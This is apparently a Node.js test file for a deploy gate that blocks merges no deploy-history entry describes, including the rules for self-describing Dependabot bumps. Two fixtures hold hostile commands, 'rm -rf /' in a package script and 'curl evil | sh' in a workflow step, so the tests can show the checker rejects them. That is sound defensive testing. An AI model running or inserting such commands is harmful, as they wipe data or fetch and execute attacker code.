#!/usr/bin/env node
/*
 * test-deploy-history.mjs — the deploy refuses a merge that no deploy-history
 * entry describes (buses-data OA-377, DEPLOY.md §3b).
 *
 *     npm run test:deploy-history
 *
 * Run from the repository root (`C:\Buses\community-bus-maps`), no
 * placeholders.
 *
 * The subject is a JOIN — "every commit about to go live is named somewhere a
 * reader of the deploy history will look" — so the arms run the real checker
 * against a real throwaway git repository, not against strings. Every arm that
 * expects green has a twin that removes the one thing making it green and
 * expects red, so no route to "described" is asserted without having been seen
 * to fail. The last arm is the wiring: a checker nothing calls guards nothing,
 * and `deploy.mjs` must run it before the backup, which is before anything on
 * the host is touched.
 */
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { bumpLevel, bumpVerdict, isDependabot, parseVersion, prNumber, undescribed } from './lib/deploy-history.mjs';

const SCRIPTS = path.dirname(fileURLToPath(import.meta.url));
const CHECK = path.join(SCRIPTS, 'check-deploy-history.mjs');

let failures = 0;
const check = (name, cond, extra) => {
  console.log(`${cond ? 'ok  ' : 'FAIL'}  ${name}`);
  if (!cond) {
    failures += 1;
    if (extra !== undefined) console.log(`        ${extra}`);
  }
};

// --- the pure function ------------------------------------------------------

check('prNumber reads a squash subject', prNumber('Fix the thing (buses-data OA-1) (#42)') === '42');
check('prNumber ignores a number mid-subject', prNumber('Entry for PR #333, written before') === null);

const bare = { sha: 'abc1234', subject: 'Something (#12)', addsFragment: false, editsDeploy: false };
const none = (commits, deployText = '', fragmentTexts = []) => undescribed({ commits, deployText, fragmentTexts });
check('a bare commit is undescribed', none([bare]).length === 1);
check('adding a fragment describes it', none([{ ...bare, addsFragment: true }]).length === 0);
check('editing DEPLOY.md describes it', none([{ ...bare, editsDeploy: true }]).length === 0);
check('#12 named in DEPLOY.md describes it', none([bare], 'went live: PR #12.').length === 0);
check('#12 named in a fragment describes it', none([bare], '', ['- **#12** was a bump.']).length === 0);
check('#123 does NOT describe #12', none([bare], 'PR #123').length === 1);
check('the short sha named describes it', none([bare], 'commit abc1234 went live').length === 0);

// --- route 4: the Dependabot bump that describes itself ---------------------

const BOT = 'dependabot[bot]';
const BOT_EMAIL = '49699333+dependabot[bot]@users.noreply.github.com';
check('isDependabot needs the name AND the noreply address', isDependabot(BOT, BOT_EMAIL) && !isDependabot(BOT, 'someone@example.com') && !isDependabot('Peter', BOT_EMAIL));

check('parseVersion reads a caret range', JSON.stringify(parseVersion('^5.12.7')) === '[5,12,7]');
check('parseVersion reads an action tag', JSON.stringify(parseVersion('v4')) === '[4,0,0]');
check('parseVersion refuses a git url', parseVersion('github:a/b') === null);
check('bumpLevel: patch', bumpLevel('5.12.5', '5.12.7') === 'patch');
check('bumpLevel: minor', bumpLevel('^5.10.0', '^5.12.0') === 'minor');
check('bumpLevel: major', bumpLevel('5.12.7', '6.0.0') === 'major');
check('bumpLevel: a 0.x minor is a major', bumpLevel('0.35.5', '0.36.0') === 'major');
check('bumpLevel: a downgrade is unknown', bumpLevel('5.12.7', '5.12.5') === 'unknown');

const pkg = (deps, extra = {}) => JSON.stringify({ name: 'x', scripts: { t: 'node t' }, ...extra, dependencies: deps }, null, 2);
const lock = (pkgs) => JSON.stringify({ lockfileVersion: 3, packages: { '': {}, ...Object.fromEntries(Object.entries(pkgs).map(([k, v]) => [k, { version: v }])) } }, null, 2);
const npmBump = (before, after, lockBefore, lockAfter) => ({
  touched: [['M', 'package-lock.json'], ['M', 'package.json']],
  texts: [
    { path: 'package-lock.json', before: lock(lockBefore), after: lock(lockAfter) },
    { path: 'package.json', before, after },
  ],
});
const FASTIFY_PATCH = npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.7' }), { 'node_modules/fastify': '5.12.5' }, { 'node_modules/fastify': '5.12.7' });

let v = bumpVerdict(FASTIFY_PATCH);
check('a fastify patch is self-describing', v.ok, v.why);
check('...and undescribed() lets it through', none([{ ...bare, bump: FASTIFY_PATCH }]).length === 0);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.7' }), pkg({ fastify: '^6.0.0' }), { 'node_modules/fastify': '5.12.7' }, { 'node_modules/fastify': '6.0.0' }));
check('a fastify MAJOR is not', !v.ok && /fastify .* major/.test(v.why), v.why);
check('...and undescribed() holds it', none([{ ...bare, bump: npmBump(pkg({ fastify: '^5.12.7' }), pkg({ fastify: '^6.0.0' }), {}, {}) }]).length === 1);
v = bumpVerdict(npmBump(pkg({ sharp: '^0.35.5' }), pkg({ sharp: '^0.35.6' }), { 'node_modules/sharp': '0.35.5' }, { 'node_modules/sharp': '0.35.6' }));
check('a sharp PATCH is not, because sharp is the rasteriser', !v.ok && /sharp/.test(v.why), v.why);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.7' }),
  { 'node_modules/fastify': '5.12.5', 'node_modules/@img/sharp-libvips-linux-x64': '1.2.0' },
  { 'node_modules/fastify': '5.12.7', 'node_modules/@img/sharp-libvips-linux-x64': '1.2.1' }));
check('a group bump that moves @img/* libvips in the lockfile is not (#483 did)', !v.ok && /@img\/sharp-libvips/.test(v.why), v.why);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.7' }),
  { 'node_modules/fastify': '5.12.5', 'node_modules/content-disposition': '2.0.1' },
  { 'node_modules/fastify': '5.12.7', 'node_modules/content-disposition': '3.0.0' }));
check('a patch that drags a top-level install up a major is not (#333 did)', !v.ok && /content-disposition/.test(v.why), v.why);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.7' }),
  { 'node_modules/fastify': '5.12.5', 'node_modules/a/node_modules/b': '1.0.0' },
  { 'node_modules/fastify': '5.12.7', 'node_modules/a/node_modules/b': '2.0.0' }));
check('...but a NESTED copy moving a major is somebody else\'s pin', v.ok, v.why);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.7' }, { scripts: { t: 'rm -rf /' } }), {}, {}));
check('a package.json that changes more than versions is not', !v.ok && /more than dependency versions/.test(v.why), v.why);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.5', leftpad: '^1.0.0' }), {}, {}));
check('a new dependency is not', !v.ok && /adds the dependency leftpad/.test(v.why), v.why);
v = bumpVerdict({ ...FASTIFY_PATCH, touched: [...FASTIFY_PATCH.touched, ['M', 'Dockerfile']] });
check('touching the Dockerfile is not', !v.ok && /Dockerfile/.test(v.why), v.why);
v = bumpVerdict({ ...FASTIFY_PATCH, touched: [...FASTIFY_PATCH.touched, ['M', 'src/server.mjs']] });
check('touching code is not', !v.ok && /src\/server\.mjs/.test(v.why), v.why);
v = bumpVerdict(npmBump(pkg({ fastify: '^5.12.5' }), pkg({ fastify: '^5.12.5' }), {}, {}));
check('a diff with no readable version change is not', !v.ok, v.why);

const wf = (ref) => `jobs:\n  t:\n    steps:\n      - uses: actions/checkout@${ref}\n      - run: npm test\n`;
const actionBump = (a, b) => ({ touched: [['M', '.github/workflows/test.yml']], texts: [{ path: '.github/workflows/test.yml', before: wf(a), after: wf(b) }] });
v = bumpVerdict(actionBump('v4.1.0', 'v4.2.0'));
check('an action minor is self-describing', v.ok, v.why);
v = bumpVerdict(actionBump('v4', 'v7'));
check('an action MAJOR is not (f8d4f4d was v4 → v7)', !v.ok && /major/.test(v.why), v.why);
v = bumpVerdict(actionBump(`${'a'.repeat(40)} # v4.1.0`, `${'b'.repeat(40)} # v4.1.1`));
check('a sha-pinned action is read by its comment', v.ok, v.why);
v = bumpVerdict({ touched: [['M', '.github/workflows/test.yml']], texts: [{ path: '.github/workflows/test.yml', before: wf('v4'), after: wf('v4').replace('npm test', 'curl evil | sh') }] });
check('a workflow that changes more than a uses: line is not', !v.ok && /more than action versions/.test(v.why), v.why);

// --- the checker, against a real repository ---------------------------------

const tmp = mkdtempSync(path.join(os.tmpdir(), 'cbm-deploy-history-'));
const repo = path.join(tmp, 'r');
mkdirSync(path.join(repo, 'docs'), { recursive: true });
mkdirSync(path.join(repo, 'CHANGELOG.d'), { recursive: true });
const git = (...a) => {
  const r = spawnSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...a], { encoding: 'utf8' });
  if (r.status !== 0) throw new Error(`git ${a.join(' ')}: ${r.stderr}`);
  return r.stdout.trim();
};
const commit = (subject, files) => {
  for (const [p, body] of Object.entries(files)) writeFileSync(path.join(repo, p), body, 'utf8');
  git('add', '-A');
  git('commit', '-q', '-m', subject);
  return git('rev-parse', '--short', 'HEAD');
};
const run = (from, to) => spawnSync(process.execPath, [CHECK, '--repo', repo, '--from', from, '--to', to], { encoding: 'utf8' });

git('init', '-q', '-b', 'main');
const base = commit('baseline', {
  'docs/DEPLOY.md': '# Deploy\n\n- **Deploy history:** old.\n',
  'CHANGELOG.d/README.md': 'readme\n',
});

// 1. a change carrying its own fragment
const withFragment = commit('A change with its entry (#10)', { 'src.txt': 'a\n', 'CHANGELOG.d/2026-09-26-a.md': '---\ndate: 2026-09-26\ntitle: "a"\n---\n\n- a\n' });
let r = run(base, withFragment);
check('a merge that adds its own fragment is green', r.status === 0, r.stderr);

// 2. a change with nothing — the fault this file is named after
const bareSha = commit('A change nobody wrote up (#11)', { 'src.txt': 'b\n' });
r = run(base, bareSha);
check('a merge with no entry is RED (exit 1)', r.status === 1, `exit ${r.status}`);
check('the refusal names the commit', r.stderr.includes(bareSha) && r.stderr.includes('#11'), r.stderr);
check('the refusal says what to do', /CHANGELOG\.d\/ fragment that names #11/.test(r.stderr), r.stderr);
check('the green commit before it is not blamed', !r.stderr.includes(withFragment), r.stderr);

// 3. the README is not a fragment — editing it is not an entry
const readmeOnly = commit('Tidy the changelog readme (#12)', { 'CHANGELOG.d/README.md': 'readme, tidied\n' });
r = run(bareSha, readmeOnly);
check('changing only CHANGELOG.d/README.md is RED', r.status === 1, `exit ${r.status}`);

// 4. an entry commit edits DEPLOY.md and describes itself
const entry = commit('Deploy-history entry, written before the deploy (#13)', { 'docs/DEPLOY.md': '# Deploy\n\n- **Deploy history:** old → #13.\n' });
r = run(readmeOnly, entry);
check('an edit to docs/DEPLOY.md is green', r.status === 0, r.stderr);

// 5. after the fact: a later fragment names #11 and #12, and the whole range goes green
const later = commit('Write up what went live undescribed (#14)', { 'CHANGELOG.d/2026-09-26-b.md': '---\ndate: 2026-09-26\ntitle: "b"\n---\n\n- #11 and #12 went live without an entry.\n' });
r = run(base, later);
check('naming #11 and #12 in a later fragment makes the range green', r.status === 0, r.stderr);
// ...but the description is read at the TO end: the same range ending before it is still red
r = run(base, entry);
check('the same commits read at a ref before that fragment are still RED', r.status === 1, `exit ${r.status}`);

// 6. nothing to deploy
r = run(later, later);
check('an empty range is green and says 0', r.status === 0 && /all 0 commit/.test(r.stdout), r.stdout + r.stderr);

// 7. a ref git cannot read is a usage error, not a green
r = run(base, 'no-such-ref');
check('an unreadable ref exits 2', r.status === 2, `exit ${r.status}`);

// 8. Dependabot, end to end: the same commit shapes, authored as the bot
const commitAs = (author, subject, files) => {
  for (const [p, body] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(repo, p)), { recursive: true });
    writeFileSync(path.join(repo, p), body, 'utf8');
  }
  git('add', '-A');
  git('commit', '-q', '--author', author, '-m', subject);
  return git('rev-parse', '--short', 'HEAD');
};
const BOT_AUTHOR = `${BOT} <${BOT_EMAIL}>`;
const deps = { fastify: '^5.12.5', sharp: '^0.35.5' };
const installed = { 'node_modules/fastify': '5.12.5', 'node_modules/sharp': '0.35.5' };
const npmFiles = (d, l) => ({ 'package.json': pkg(d), 'package-lock.json': lock(l) });
const setup = commitAs('t <t@t>', 'package files (#20)', { ...npmFiles(deps, installed), '.github/workflows/test.yml': wf('v4.1.0'), 'Dockerfile': 'FROM node:24-slim\n', 'CHANGELOG.d/2026-10-21-c.md': '---\ndate: 2026-10-21\ntitle: "c"\n---\n\n- c\n' });

const patch = commitAs(BOT_AUTHOR, 'Bump fastify from 5.12.5 to 5.12.7 in the routine group (#21)', npmFiles({ ...deps, fastify: '^5.12.7' }, { ...installed, 'node_modules/fastify': '5.12.7' }));
r = run(setup, patch);
check('a Dependabot patch bump with no fragment is green', r.status === 0, r.stderr);
check('...and the green says which bump it accepted on its own word', r.stdout.includes(patch) && /fastify 5\.12\.5 → 5\.12\.7 \(patch\)/.test(r.stdout), r.stdout);

const human = commitAs('Someone <someone@example.com>', 'Bump fastify from 5.12.7 to 5.12.8 (#22)', npmFiles({ ...deps, fastify: '^5.12.8' }, { ...installed, 'node_modules/fastify': '5.12.8' }));
r = run(patch, human);
check('the same bump by a human is RED', r.status === 1, `exit ${r.status}`);

const sharpBump = commitAs(BOT_AUTHOR, 'Bump sharp from 0.35.5 to 0.35.6 (#23)', npmFiles({ ...deps, fastify: '^5.12.8', sharp: '^0.35.6' }, { ...installed, 'node_modules/fastify': '5.12.8', 'node_modules/sharp': '0.35.6' }));
r = run(human, sharpBump);
check('a Dependabot SHARP patch is RED', r.status === 1, `exit ${r.status}`);
check('...and the refusal says it is sharp', r.stderr.includes(sharpBump) && /not self-describing: it moves sharp/.test(r.stderr), r.stderr);
const sharpStderr = r.stderr;

const major = commitAs(BOT_AUTHOR, 'Bump fastify from 5.12.8 to 6.0.0 (#24)', npmFiles({ ...deps, fastify: '^6.0.0', sharp: '^0.35.6' }, { ...installed, 'node_modules/fastify': '6.0.0', 'node_modules/sharp': '0.35.6' }));
r = run(sharpBump, major);
check('a Dependabot MAJOR is RED', r.status === 1, `exit ${r.status}`);
check('...and the refusal says it is a major', /fastify .*6\.0\.0 is a major bump/.test(r.stderr), r.stderr);
const majorStderr = r.stderr;

const docker = commitAs(BOT_AUTHOR, 'Bump node from 24-slim to 26-slim (#25)', { 'Dockerfile': 'FROM node:26-slim\n' });
r = run(major, docker);
check('a Dependabot base-image bump is RED', r.status === 1 && /Dockerfile/.test(r.stderr), r.stderr);

const action = commitAs(BOT_AUTHOR, 'Bump actions/checkout from 4.1.0 to 4.2.0 (#26)', { '.github/workflows/test.yml': wf('v4.2.0') });
r = run(docker, action);
check('a Dependabot action minor is green', r.status === 0, r.stderr);

// ...and after the fact, a fragment naming the red ones still describes them
const writeUp = commit('Write up #22 to #25 (#27)', { 'CHANGELOG.d/2026-10-21-d.md': '---\ndate: 2026-10-21\ntitle: "d"\n---\n\n- #22, #23, #24 and #25.\n' });
r = run(setup, writeUp);
check('a fragment naming the refused bumps makes the range green', r.status === 0, r.stderr);

if (process.argv.includes('--show-red')) console.log(`\n--- sharp ---\n${sharpStderr}\n--- major ---\n${majorStderr}`);

rmSync(tmp, { recursive: true, force: true });

// --- the wiring -------------------------------------------------------------

const deploy = readFileSync(path.join(SCRIPTS, 'deploy.mjs'), 'utf8');
const callAt = deploy.indexOf('check-deploy-history.mjs');
const backupAt = deploy.indexOf("console.log('-- 1. docker compose run --rm backup')");
check('deploy.mjs runs check-deploy-history.mjs', callAt >= 0);
check('...before the backup, so nothing on the host is touched first', callAt >= 0 && backupAt > callAt, `call at ${callAt}, backup at ${backupAt}`);
check('...and fetches first, so origin/main is what the host will pull', /\['fetch', 'origin', 'main'\]/.test(deploy));

console.log('');
if (failures) {
  console.error(`✗ ${failures} check(s) failed.`);
  process.exit(1);
}
console.log('✓ a merge nobody wrote up cannot be deployed, and each way of writing it up is seen to count.');
